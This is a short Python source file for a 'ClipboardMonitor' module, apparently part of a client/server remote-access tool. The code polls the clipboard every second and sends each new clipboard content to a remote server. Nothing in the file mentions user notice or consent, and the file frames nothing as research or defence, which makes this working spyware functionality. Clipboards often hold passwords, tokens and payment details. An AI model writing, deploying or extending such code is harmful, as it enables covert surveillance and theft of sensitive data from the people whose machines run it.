import threading
import time

from client.util.modules.module import Module


class ClipboardMonitor(Module):
    def __init__(self):
        super().__init__()

    def run(self):
        try:
            self.send_to_server(1, 'Importing module: pyperclip', 0)
            import pyperclip
            self.send_to_server(1, 'Clipboard monitoring started', 1)
            previous_data = pyperclip.paste()
            self.status = True
            while self.status:
                current_data = pyperclip.paste()
                if current_data != previous_data:
                    self.send_to_server(1, f'Clipboard content changed: {current_data}', 0)
                    previous_data = current_data
                time.sleep(1)
            self.send_to_server(1, 'Clipboard monitoring stopped', 0)
        except Exception as e:
            self.send_to_server(0, f'Error occurs: {e}', 0)
        self.send_to_server(1, f'Thread ended: {threading.current_thread().name}', 1)
